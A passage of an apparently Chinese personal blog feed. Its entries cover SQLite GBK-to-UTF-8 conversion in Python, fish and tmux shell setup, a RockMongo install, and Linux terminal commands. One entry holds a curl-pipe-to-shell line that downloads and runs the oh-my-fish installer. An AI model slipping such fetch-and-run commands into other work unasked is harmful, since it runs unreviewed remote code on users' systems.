      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;
    
    </summary>
    
      <category term="Penetration" scheme="https://zzdkl.com.cn/categories/Penetration/"/>
    
      <category term="SSL" scheme="https://zzdkl.com.cn/categories/Penetration/SSL/"/>
    
    
      <category term="SSL" scheme="https://zzdkl.com.cn/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>sql数据库学习</title>
    <link href="https://zzdkl.com.cn/2019/08/29/sql_db_learning/"/>
    <id>https://zzdkl.com.cn/2019/08/29/sql_db_learning/</id>
    <published>2019-08-29T01:46:29.012Z</published>
    <updated>2019-08-29T01:47:40.933Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天任务：数据库文件gbk转utf-8码</p><a id="more"></a><h1 id="01-工具：Navicat"><a href="#01-工具：Navicat" class="headerlink" title="01. 工具：Navicat"></a>01. 工具：Navicat</h1><p><a href="https://www.navicat.com.cn/manual/online_manual/cn/navicat/win_manual/" target="_blank" rel="noopener">navicat官方教程</a> </p><p><a href="http://www.formysql.com/wenti/jian-jie.html" target="_blank" rel="noopener">Navicat其他非官方教程</a></p><h1 id="02-操作步骤"><a href="#02-操作步骤" class="headerlink" title="02. 操作步骤"></a>02. 操作步骤</h1><p>网上找了找，确实没有很好的工具进行直接转换。</p><p>只能手工操作了，思路如下：</p><ol><li><p>把数据从数据库导出来</p></li><li><p>再把数据导进去就可以了</p></li></ol><p>操作是不是很简单？屁了，慢慢操作吧</p><h1 id="03-导出数据"><a href="#03-导出数据" class="headerlink" title="03. 导出数据"></a>03. 导出数据</h1><p>现在要对数据库进行导出，首先要干的肯定是先备份数据</p><p>导出数据有两种操作，一种是用命令行，一种是用python</p><p>这里我们选择用python</p><p>哦吼，搞不定，放弃。先弄sql命令吧</p><p>哦吼，又搞不定，放弃，弄回python脚本，毕竟有现成的成功读取的脚本</p><p>用上之前写好的脚本，报错，报错。</p><p>算了，自己重新写一份吧<a href="https://blog.csdn.net/Chunying27/article/details/52464200" target="_blank" rel="noopener">python读取sqlite参考链接</a> </p><p>淦，改了改总算好了</p><p>我们把之前的脚本进行改了改，就可以实现读取功能了:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sqlite3,</span><br><span class="line"><span class="comment">#导入模块</span></span><br><span class="line">vulnDB = <span class="string">'vuln.db'</span></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(vulnDB)</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">conn.text_factory = <span class="keyword">lambda</span> x: str(x, <span class="string">'gbk'</span>, <span class="string">'ignore'</span>)</span><br><span class="line"><span class="comment">#对读取的sqlite进行gbk处理</span></span><br><span class="line"></span><br><span class="line">res = conn.execute(</span><br><span class="line">            <span class="string">r"""select * from VULNDB"""</span>).fetchone()</span><br><span class="line"></span><br><span class="line">print(res[<span class="number">3</span>])</span><br></pre></td></tr></tbody></table></figure><h1 id="04-写入数据"><a href="#04-写入数据" class="headerlink" title="04. 写入数据"></a>04. 写入数据</h1><p> 把数据导出来之后就要进行utf-8写入了</p><p>现在尝试进行尝试写入数据后，会报错，找了一下资料，找到了解决办法<br><a href="https://blog.csdn.net/u013264172/article/details/52987954" target="_blank" rel="noopener">写入参考链接</a></p><p>最终代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sqlite3,os</span><br><span class="line"><span class="comment">#导入模块</span></span><br><span class="line"><span class="comment"># os.system('CHCP 65001')</span></span><br><span class="line">vulnDB = <span class="string">'vuln.db'</span></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(vulnDB)</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">conn.text_factory = <span class="keyword">lambda</span> x: str(x, <span class="string">'gbk'</span>, <span class="string">'ignore'</span>)</span><br><span class="line"><span class="comment">#不太清楚是啥。加进去先</span></span><br><span class="line"><span class="comment"># 这里应该是对数据库进行转码</span></span><br><span class="line"></span><br><span class="line">res = conn.execute(</span><br><span class="line">            <span class="string">r"""select * from VULNDB"""</span>).fetchone()</span><br><span class="line"><span class="comment">#     # print(type(res.fetchone()))</span></span><br><span class="line"><span class="comment">#     pluginID, vulname, _, vul_desc, vul_solu = res</span></span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">sql = <span class="string">r"""insert into VULNDB1 (Plugin_ID,NAME,Risk,Description,Solution) values(?,?,?,?,?)"""</span></span><br><span class="line"></span><br><span class="line">para = res</span><br><span class="line"></span><br><span class="line">conn.execute(sql,para)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br></pre></td></tr></tbody></table></figure><h1 id="05-批量读取写入"><a href="#05-批量读取写入" class="headerlink" title="05. 批量读取写入"></a>05. 批量读取写入</h1><p>接下来就是如何把这个数据库逐步读取，然后写入了</p><p>刚开始的思路是for进行迭代读取，然后发现有问题</p><p>找资料，无果</p><p>不说了，问大佬去，得到结果如下：</p><figure class="highlight autoit"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  fetchall出来的结果可迭代的</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>  <span class="keyword">for</span> i <span class="keyword">in</span> conn.<span class="built_in">execute</span>(sql).fetchall():</span><br><span class="line">    conn.<span class="built_in">execute</span>(update_sql)</span><br><span class="line">    当然，这样写可能导致异常</span><br></pre></td></tr></tbody></table></figure><p>进行尝试，除了点小错误就是<code>for i in conn.execute(sql).fetchall</code>这里忘了加上括号，导致报错说不可迭代。大佬一语中的的指出了问题，这就是大佬啊</p><p>最后代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sqlite3,os</span><br><span class="line"><span class="comment">#导入模块</span></span><br><span class="line"><span class="comment"># os.system('CHCP 65001')</span></span><br><span class="line">vulnDB = <span class="string">'vuln.db'</span></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(vulnDB)</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">conn.text_factory = <span class="keyword">lambda</span> x: str(x, <span class="string">'gbk'</span>, <span class="string">'ignore'</span>)</span><br><span class="line"><span class="comment">#不太清楚是啥。加进去先</span></span><br><span class="line"></span><br><span class="line">sqlread = <span class="string">r"""select * from VULNDB"""</span></span><br><span class="line"></span><br><span class="line">sqlwrite = <span class="string">r"""insert into VULNDB1 (Plugin_ID,NAME,Risk,Description,Solution) values(?,?,?,?,?)"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> conn.execute(sqlread).fetchall():</span><br><span class="line">  </span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">    para = i</span><br><span class="line"></span><br><span class="line">    conn.execute(sqlwrite,para)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br></pre></td></tr></tbody></table></figure><p>还有个小知识点就是commit()函数不要写在循环里面，占用资源</p><h1 id="06-总结"><a href="#06-总结" class="headerlink" title="06. 总结"></a>06. 总结</h1><p>总的来说就是不断排坑的过程，但是思路要清晰，然后找找资料，遇到了关卡先思考一下，实在不行就去麻烦大佬 XD (笑)</p><p><a href="">GitHub代码地址</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天任务：数据库文件gbk转utf-8码&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://zzdkl.com.cn/categories/Python/"/>
    
      <category term="Database" scheme="https://zzdkl.com.cn/categories/Database/"/>
    
      <category term="sql" scheme="https://zzdkl.com.cn/categories/Database/sql/"/>
    
      <category term="db" scheme="https://zzdkl.com.cn/categories/Python/db/"/>
    
    
      <category term="Python" scheme="https://zzdkl.com.cn/tags/Python/"/>
    
      <category term="sql" scheme="https://zzdkl.com.cn/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Shell调优</title>
    <link href="https://zzdkl.com.cn/2019/08/29/shell_optimize/"/>
    <id>https://zzdkl.com.cn/2019/08/29/shell_optimize/</id>
    <published>2019-08-29T01:44:02.806Z</published>
    <updated>2019-08-29T02:46:18.694Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天来折腾一下最后的shell调优，参考以前的fish安装和tmux设置</p><p>今天折腾的就将会是最终的shell界面了</p><a id="more"></a><h1 id="01-设置自启和默认shell"><a href="#01-设置自启和默认shell" class="headerlink" title="01. 设置自启和默认shell"></a>01. 设置自启和默认shell</h1><p>这里我们设置一下默认shell是fish，然后默认打开tmux</p><h2 id="01-默认打开shell为oh-my-fish"><a href="#01-默认打开shell为oh-my-fish" class="headerlink" title="01. 默认打开shell为oh-my-fish"></a>01. 默认打开shell为oh-my-fish</h2><p><a href="https://wiki.archlinux.org/index.php/Fish_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%B8%8D%E8%A6%81%E6%8A%8Afish%E8%AE%BE%E4%B8%BA%E9%BB%98%E8%AE%A4shell" target="_blank" rel="noopener">参考链接：不要把fish设置成默认fish</a> from Arch Linux</p><p>在.bashrc最后加入<code>exec fish</code>就可以了</p><p>如果你想进入bash而不是fish，使用命令 <code>bash --norc</code></p><hr><p>!!!下面的操作过于危险，我们选择上面更好的 <a href="https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/zh-CN/FAQ.md" target="_blank" rel="noopener">设置fish为默认shell参考链接</a></p><hr><pre><code><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">如何把 fish 设置为我默认的 shell?</span><br><span class="line">添加 Fish 到 /etc/shells:</span><br><span class="line"></span><br><span class="line">echo <span class="string">"/usr/local/bin/fish"</span> | sudo tee -a <span class="regexp">/etc/</span>shells</span><br><span class="line">切换并保存默认 <span class="string">shell:</span></span><br><span class="line"></span><br><span class="line">chsh -s <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>fish</span><br><span class="line">切换之前的 <span class="string">shell:</span></span><br><span class="line"></span><br><span class="line">一般来说是 <span class="regexp">/bin/</span>bash、<span class="regexp">/bin/</span>tcsh 或者 <span class="regexp">/bin/</span>zsh.</span><br><span class="line"></span><br><span class="line">chsh -s <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></tbody></table></figure></code></pre><p>上面是参考答案，首先找出fish这个shell在哪里 <code>whereis fish</code></p><p>我的是在<code>/usr/bin/fish</code>上，更改后重连即可</p><h2 id="02-终端默认开启tmux"><a href="#02-终端默认开启tmux" class="headerlink" title="02. 终端默认开启tmux"></a>02. 终端默认开启tmux</h2><p>更改    .bashrc</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">[[ -z "$TMUX" ]]</span> ;<span class="keyword">then</span></span><br><span class="line">    ID=<span class="string">"`tmux ls | grep -vm1 attached | cut -d: -f1`"</span> # get the id of a deattached session</span><br><span class="line">    <span class="keyword">if</span> <span class="string">[[ -z "$ID" ]]</span> ;<span class="keyword">then</span> # <span class="keyword">if</span> <span class="keyword">not</span> available <span class="built_in">create</span> a new one</span><br><span class="line">        tmux new-session</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tmux attach-session -t <span class="string">"$ID"</span> # <span class="keyword">if</span> available attach to it</span><br><span class="line">    fi</span><br><span class="line">fi</span><br></pre></td></tr></tbody></table></figure><p><a href="https://wiki.archlinux.org/index.php/Tmux_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E8%87%AA%E5%8A%A8%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E5%B8%83%E5%B1%80%E5%90%AF%E5%8A%A8tmux" target="_blank" rel="noopener">参考链接</a><br>这里面的每次启动shell时连接上之前的tmux</p><h1 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h1><p>血淋淋的教训，谨记谨记</p><ol><li><p>不要把fish设置成默认shell，很麻烦，在.bashrc里设置自启就好，需要bash的时候就<code>bash -norc</code>即可，非常方便</p></li><li><p>把tmux的.bashrc设置放在fish前面，顺序不要搞错，不然就没有想要的效果</p></li></ol><p>最后结果如下：</p><p><img src="/upload_image/2019/04/Snipaste_2019-04-25_17-15-38.png" alt="最后结果"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天来折腾一下最后的shell调优，参考以前的fish安装和tmux设置&lt;/p&gt;
&lt;p&gt;今天折腾的就将会是最终的shell界面了&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="Shell" scheme="https://zzdkl.com.cn/categories/Linux/Shell/"/>
    
    
      <category term="Shell" scheme="https://zzdkl.com.cn/tags/Shell/"/>
    
      <category term="PS" scheme="https://zzdkl.com.cn/tags/PS/"/>
    
  </entry>
  
  <entry>
    <title>Mongo搭建</title>
    <link href="https://zzdkl.com.cn/2019/08/29/mongo_installation/"/>
    <id>https://zzdkl.com.cn/2019/08/29/mongo_installation/</id>
    <published>2019-08-29T01:42:17.138Z</published>
    <updated>2019-08-29T01:43:34.876Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>某天遇到了某项事件：mongoDB未授权访问查看数据<br>也就是搭建一个mongoDB管理器</p><a id="more"></a><h1 id="01-准备"><a href="#01-准备" class="headerlink" title="01 准备"></a>01 准备</h1><p>使用工具：<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpmyAdmin</a> 和 <a href="https://github.com/iwind/rockmongo" target="_blank" rel="noopener">rockmongo</a>  </p><h1 id="02-进行设置"><a href="#02-进行设置" class="headerlink" title="02 进行设置"></a>02 进行设置</h1><p><a href="https://blog.csdn.net/aeoliancrazy/article/details/78558791" target="_blank" rel="noopener">参考链接</a></p><p>分为以下几点：</p><ol><li>切换PHP版本</li><li><a href="https://windows.php.net/downloads/pecl/releases/mongo/1.6.16/" target="_blank" rel="noopener">下载dll文件</a> 并替换到<code>PHPTutorial\php\php-5.6.27-nts\ext</code>这个目录下</li><li>重启服务, 搜索<code>http://localhost/phpinfo.php</code> 看有没有mongo拓展</li></ol><h1 id="03-总结"><a href="#03-总结" class="headerlink" title="03 总结"></a>03 总结</h1><p>按照步骤来就行, 没啥问题<br><a href="https://blog.csdn.net/aeoliancrazy/article/details/78107714" target="_blank" rel="noopener">mongo使用方法</a></p><p>最终成果:<br><img src="/upload_image/2019/07/Snipaste_2019-07-15_14-51-43.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;某天遇到了某项事件：mongoDB未授权访问查看数据&lt;br&gt;也就是搭建一个mongoDB管理器&lt;/p&gt;
    
    </summary>
    
      <category term="Database" scheme="https://zzdkl.com.cn/categories/Database/"/>
    
      <category term="Mongo" scheme="https://zzdkl.com.cn/categories/Database/Mongo/"/>
    
    
      <category term="Mongo" scheme="https://zzdkl.com.cn/tags/Mongo/"/>
    
  </entry>
  
  <entry>
    <title>Linux后台终端命令</title>
    <link href="https://zzdkl.com.cn/2019/08/29/linux_backstage_command/"/>
    <id>https://zzdkl.com.cn/2019/08/29/linux_backstage_command/</id>
    <published>2019-08-29T01:38:27.685Z</published>
    <updated>2019-08-29T01:41:02.749Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天介绍一下Linux下的命令，screen，nohup，tmux都有一些共同点，终端复用，具体就去网上查吧。<br>这里介绍一下用法</p><a id="more"></a><h1 id="01-screen的用法"><a href="#01-screen的用法" class="headerlink" title="01 screen的用法"></a>01 screen的用法</h1><p>​    <a href="https://linux.cn/article-8215-1.html" target="_blank" rel="noopener">参考资料</a></p><ol><li>创建screen会话    </li></ol><p>​    <code>screen -S NAME</code> / <code>screen COMMAND</code>(执行完成后退出)</p><ol start="2"><li><p>看看有哪些会话 <code>screen -ls</code></p></li><li><p>切换到用 <code>screen -r (这里写上pid或者名字，例如screen -r lnmp，从-ls上找到的)</code></p></li><li><p>从session里切回到主terminal <code>Ctrl+a+d</code></p></li><li><p>从session里杀掉此session <code>Ctrl+a+k</code>，也可以用<code>exit</code></p></li><li><p>如果有一些杀掉的session(窗口)dead掉的时候，清除用<code>screen -wipe</code>，也可以用<code>kill</code>命令</p></li><li><p>screen状态为Attached的时候连上不，用<code>screen -D  -r ＜session-id&gt;</code>，-D -r 先踢掉前一用户，再登陆</p></li><li><p>还有待补充</p></li></ol><h1 id="02-tmux用法"><a href="#02-tmux用法" class="headerlink" title="02 tmux用法"></a>02 tmux用法</h1><p><a href="http://louiszhai.github.io/2017/09/30/tmux/" target="_blank" rel="noopener">参考链接</a></p><ol start="0"><li><p>预备知识： 总session，分windows，再分pane</p></li><li><p>和screen类似，这个也有快捷键<code>Ctrl+b</code></p></li><li><p>Session操作</p><p>创建session <code>tmux</code> / <code>tmux new -s NAME</code></p><p>重命名session： <code>Ctrl+b $</code>  </p><p>查看session 快捷键<code>Ctrl+b s</code> 或者<code>tmux ls</code></p><p>退出session到terminal <code>tmux detach</code>  快捷键<code>Ctrl+b+d</code></p><p>进入会话<code>tmux a -t session_name</code> / <code>tmux a</code> 默认进入第一个session</p></li><li><p>关闭server, session, window, pane</p><p>kill命令有kill-pane、kill-server、kill-session 和 kill-window</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tmux <span class="keyword">kill</span>-<span class="keyword">server</span> <span class="comment"># 关闭服务器，所有的会话都将关闭</span></span><br><span class="line">tmux <span class="keyword">kill</span>-<span class="keyword">session</span> -t demo <span class="comment"># 关闭demo会话</span></span><br><span class="line">tmux <span class="keyword">kill</span>-<span class="keyword">window</span></span><br><span class="line">tmux <span class="keyword">kill</span>-pane</span><br></pre></td></tr></tbody></table></figure></li><li><p>修改快捷键</p><ol><li><p>首先更改快捷指令<code>Ctrl+b</code> 为 <code>Ctrl+a</code> ，和screen的一样来</p><p>首先新建一个文件<code>~/.tmux.conf</code>,有的话就直接vim修改</p><p>更改好以后可以直接<code>restart tmux</code>或者在tmux里<code>Ctrl+b :</code> 输入 <code>source-file ~/.tmux.conf</code> 即可生效</p></li><li><p>这里我直接采用<code>https://github.com/gpakosz/.tmux</code>这个配置，挺好用的，真棒</p><p> 这个配置有很多特色，吸引我的是两个，一个是外观，一个是可以直接配合fish进行完全美化。</p><p> 特色包括了：鼠标支持<code>Ctrl+a m</code>，支持窗口拖拽等，非常好用 </p></li></ol></li><li><p>window 操作</p><p>新建window为<code>Ctrl+a c</code>，</p><p>关闭为<code>Ctrl+a &amp;</code>，</p><p>切换为<code>Ctrl+a p/n</code>，</p><p>之后就是重命名了<code>Ctrl+a ,</code>，</p><p>修改当前窗口编号（适用于窗口重新排序）为<code>Ctrl+a .</code></p><p>切换window直接<code>Ctrl+a 0~9</code></p></li><li><p>pane 操作</p><ol><li><p>关闭pane为 <code>Ctrl+a x</code>,或者上面的<code>tmux kill-pane</code></p></li><li><p>切换可用鼠标或者<code>Ctrl+a h,j,k,l</code></p></li><li><p>新建pane为 <code>Ctrl+a -</code> 和 <code>Ctrl+a |</code></p></li><li><p>最大化当前面板，再重复一次按键后恢复正常 <code>Ctrl+b z</code></p></li><li><p>显示面板编号，在编号消失前输入对应的数字可切换到相应的面板 <code>Ctrl+b q</code></p></li></ol></li><li><p>最后是复制粘贴到本地，<code>gpakosz</code>这个有鼠标支持</p> <figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">前提：开启了鼠标支持</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用鼠标(Tmux v2.1)</span></span><br><span class="line"><span class="comment"># set -g mouse on</span></span><br><span class="line"></span><br><span class="line">打开鼠标支持<span class="string">`Ctrl+a m`</span></span><br><span class="line"></span><br><span class="line">按住 <span class="keyword">shift</span>，鼠标左键选择文本，选择“复制”，<span class="keyword">shift</span>+insert。</span><br><span class="line"></span><br><span class="line"><span class="comment">#注意全程按住 shift。</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h1 id="03-有趣的地方来了"><a href="#03-有趣的地方来了" class="headerlink" title="03 有趣的地方来了"></a>03 有趣的地方来了</h1><pre><code>写一个新的blog记录这有趣的事情涉及到终端美化方面</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天介绍一下Linux下的命令，screen，nohup，tmux都有一些共同点，终端复用，具体就去网上查吧。&lt;br&gt;这里介绍一下用法&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="command" scheme="https://zzdkl.com.cn/categories/Linux/command/"/>
    
    
      <category term="Linux" scheme="https://zzdkl.com.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>一些Linux命令</title>
    <link href="https://zzdkl.com.cn/2019/08/29/some_linux_command/"/>
    <id>https://zzdkl.com.cn/2019/08/29/some_linux_command/</id>
    <published>2019-08-29T01:35:24.408Z</published>
    <updated>2019-08-29T01:36:47.047Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-把一些好用的Linux命令收集起来"><a href="#00-把一些好用的Linux命令收集起来" class="headerlink" title="00 把一些好用的Linux命令收集起来"></a>00 把一些好用的Linux命令收集起来</h1><a id="more"></a><ol><li><p><code>lrzsz</code> 这个命令是服务器用来下载（Received）上传（Send）文件到客户端的，具体用法是：</p><ol><li>文件上传到服务器，服务器接收文件为：<code>rz</code> (Received)</li><li>文件下载回本地，服务器发送文件为：<code>sz</code> (Send)</li></ol></li><li><p>让命令走代理            <a href="https://blog.fazero.me/2015/09/15/%E8%AE%A9%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">参考链接</a></p><ol><li><p>修改<code>.bashrc</code>，增加</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias setproxy='export ALL_PROXY=socks5://127.0.0.1:10808'</span><br><span class="line">alias unsetproxy='unset ALL_PROXY'</span><br></pre></td></tr></tbody></table></figure><p>两条命令</p></li><li><p>用的时候setproxy，不用就unsetproxy</p></li><li><p>前提：打开了代理软件</p></li></ol></li><li><p>CentOS更新git <a href="https://phpcj.org/centos%E6%B7%BB%E5%8A%A0ius%E6%BA%90%EF%BC%8C%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%ACgit/" target="_blank" rel="noopener">参考链接</a></p><ol><li>添加源</li><li>卸载旧git</li><li><code>yum install git2u</code></li></ol></li><li><p>更好用的Shell：Oh-my-fish</p><ol><li><p>安装fish，安装oh-my-fish  <a href="https://linux.cn/article-9515-1.html" target="_blank" rel="noopener">参考链接</a>  <a href="http://fishshell.com/#platform_tabs" target="_blank" rel="noopener">fish最新版安装参考网页</a></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-add-repository ppa:fish-shell/release-3</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install fish</span><br><span class="line"></span><br><span class="line">curl -L github.com/oh-my-fish/oh-my-fish/raw/master/bin/install | fish</span><br></pre></td></tr></tbody></table></figure></li><li><p>安装主题：theme-bobthefish <a 